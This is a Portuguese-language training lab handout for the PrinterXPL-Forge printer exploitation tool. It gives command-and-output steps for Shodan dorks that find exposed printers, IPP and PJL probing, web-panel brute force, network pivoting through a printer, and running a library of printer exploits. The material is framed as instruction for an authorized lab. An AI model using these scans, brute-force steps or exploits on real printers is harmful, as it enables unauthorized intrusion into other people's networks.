# Lab 02 — PrinterXPL-Forge (PXF)

**Repo:** `submodules/Uniao-Geek/PrinterXPL-Forge`  
**Entry:** `python src/main.py` com `PYTHONPATH=src`  
**Versao auditada:** v3.1.x  
**Arsenal:** 6 modulos core + **192** exploits em `xpl/research/`

---

## 0. Variaveis de ambiente (cada sessao)

**IN**
```powershell
cd C:\Projetos-SafeLabs\submodules\Uniao-Geek\PrinterXPL-Forge
$env:PYTHONPATH = "src"
$env:TARGET = "192.168.10.20"   # IP da impressora no lab
```

**OUT**
```
(silencioso — variaveis definidas)
```

---

## 1. Help e portas default

**IN**
```powershell
python src\main.py --help
```

**OUT** (trecho)
```
usage: printerxpl-forge [-h] [-s] [-q] [-d] ...
                        [--discover-local] [--discover-online]
                        [--ipp] [--ipp-submit] [--xpl-list] ...
  --port-raw PORT       (default 9100 JetDirect)
  --port-ipp PORT       (default 631)
  --port-lpd PORT       (default 515)
```

Slide: memorizar **631 IPP**, **9100 RAW**, **515 LPD**.

---

## 2. Shodan — achar impressoras

| Query | Uso |
|-------|-----|
| `port:631 product:"CUPS"` | IPP/CUPS |
| `port:9100 "JetDirect" OR "Printer"` | RAW |
| `http.title:"HP LaserJet" port:80,443` | Painel web |
| `product:"Canon" port:631 country:BR` | Filtro geo (ajustar) |

**IN** (PXF online discovery via Shodan API)
```powershell
$env:SHODAN_API_KEY = "SUA_CHAVE_LAB"
python src\main.py --discover-online --shodan --dork-port 631 --dork-limit 5
```

**OUT** (ilustrativo)
```
[*] Shodan query: port:631 ...
[+] 5 hosts returned
    203.x.x.x:631  org:Example Corp  product: CUPS
    ...
```

---

## 3. Discovery local (LAN lab)

**IN**
```powershell
python src\main.py --discover-local
```

**OUT**
```
[*] Scanning local subnet for printers ...
[+] Found printer 192.168.10.20  ports: 631,9100,80
[+] Vendor hint: HP / Canon / ...
```

Se vazio: confirmar impressora ligada e mesma VLAN.

---

## 4. Capabilities / auto-detect (check)

**IN**
```powershell
python src\main.py $env:TARGET --safe auto
```

**OUT**
```
[*] Probing 192.168.10.20 ...
[+] Port 631 open (IPP)
[+] Port 9100 open (RAW)
[+] HTTP title: HP LaserJet ...
[+] Suggested mode: pjl | ps | ipp
```

Flag `--safe` = verificar linguagem antes de enviar payload.

---

## 5. Listar biblioteca de exploits

**IN**
```powershell
python src\main.py --xpl-list
```

**OUT**
```
========================================================================
PrinterXPL-Forge Exploit Library (192 exploits) (192)
[USR] 1  [edb] 1  [EDB] 28  [MSF] 22  [RES] 139
========================================================================
SRC    ID                             SEV        CVSS   CAT              TITLE
------------------------------------------------------------------------
[EDB] EDB-41920                      critical   9.8    auth_bypass      HP LaserJet/MFP Hardcoded ...
[RES] edb-cve-2018-5924              critical   9.8                     FAXPLOIT HP/Samsung MFP ...
...
```

Slide: categorias `rce`, `auth_bypass`, `passback`, `ipp`, `pjl`.

---

## 6. Check exploit especifico (lab)

**IN**
```powershell
python src\main.py --xpl-check research-universal-printer-enum
```

**OUT** (alvo lab com 9100 aberto)
```
[*] Checking research-universal-printer-enum ...
[+] Host 192.168.10.20 port 9100 open
[+] Banner: @PJL INFO ID
[+] Vendor: HP
[+] CHECK: likely vulnerable / applicable
```

**OUT** (sem impressora / timeout)
```
[-] No printer ports responded
```

Nota instrutor: este check pode demorar; usar IP fixo no lab.

---

## 7. IPP — enumerar filas

**IN**
```powershell
python src\main.py $env:TARGET --ipp
```

**OUT**
```
[*] IPP probe http://192.168.10.20:631/ipp/print
[+] Printer-uri: ipp://192.168.10.20/ipp/print
[+] Printer-state: idle
[+] Document formats: application/pdf, image/pwg-raster, ...
```

---

## 8. IPP submit (dry-run default)

**IN**
```powershell
python src\main.py $env:TARGET --ipp-submit
```

**OUT**
```
[*] Dry-run: would submit test job to ipp://...
[!] Use --no-dry to actually send (LAB ONLY)
```

**IN** (envio real — somente lab autorizado)
```powershell
python src\main.py $env:TARGET --ipp-submit --no-dry
```

**OUT**
```
[+] Job submitted job-id=42
```

---

## 9. JetDirect / PJL

**IN**
```powershell
python src\main.py $env:TARGET pjl -s
```

**OUT**
```
[*] Safe mode: testing PJL support ...
[+] PJL supported
[*] Sending PJL job ...
[+] @PJL INFO ID response received
```

Modos alternativos: `ps` (PostScript), `pcl` (PCL).

---

## 10. Brute force painel web

**IN**
```powershell
python src\main.py $env:TARGET --bruteforce --bf-vendor hp --bf-wordlist ..\..\..\..\.tmp\lab-hp-printer.lst
```

**OUT**
```
[*] Bruteforce http://192.168.10.20/ ...
[+] FOUND admin:admin (or first match)
```

Correlacionar com WFH Lab 01 (`default-creds --category printer`).

---

## 11. Storage / pivot (conceito avancado)

**IN**
```powershell
python src\main.py $env:TARGET --storage
python src\main.py $env:TARGET --pivot --pivot-scan 192.168.10.0/24
```

**OUT** (quando suportado pelo modelo)
```
[+] Stored jobs / paths enumerated
[+] Pivot scan initiated via printer HTTP ...
```

Slide: impressora como pivot na rede interna.

---

## 12. Run exploit da biblioteca (lab)

**IN**
```powershell
python src\main.py $env:TARGET --xpl-run research-hp-laserjet-default-creds
```

**OUT** (exemplo generico)
```
[*] Running exploit research-hp-laserjet-default-creds against 192.168.10.20
[+] Exploit completed: credentials recovered / check passed
```

IDs reais: obter de `--xpl-list` antes da aula.

---

## 13. Fluxo slide-a-slide (aula impressoras)

| Slide | Titulo | IN | OUT chave |
|-------|--------|-----|-----------|
| 1 | Shodan | `port:631 product:"CUPS"` | IPs candidatos |
| 2 | Discover | `--discover-local` | IP lab |
| 3 | Check | `TARGET --safe auto` | Portas 631/9100 |
| 4 | IPP | `TARGET --ipp` | printer-uri |
| 5 | PJL | `TARGET pjl -s` | PJL OK |
| 6 | Arsenal | `--xpl-list` | 192 exploits |
| 7 | Exploit | `--xpl-check ID` | vulnerable / not |

---

## 14. Portas e protocolos (referencia slide)

| Porta | Protocolo | Flag PXF |
|------:|-----------|----------|
| 631 | IPP/CUPS | `--ipp`, `--ipp-submit` |
| 9100 | JetDirect RAW | `pjl`, `ps`, `pcl` |
| 515 | LPD | `--port-lpd` |
| 80/443 | HTTP admin | `--bruteforce` |
| 161 | SNMP | `--port-snmp` |

---

## Troubleshooting

| Sintoma | Acao |
|---------|------|
| `ModuleNotFoundError: core` | `$env:PYTHONPATH = "src"` |
| Shodan vazio | Verificar `SHODAN_API_KEY` |
| `--xpl-check` lento | IP lab fixo; nao usar internet aleatoria |
| IPP 401 | Usar `--bruteforce` ou credencial do WFH |
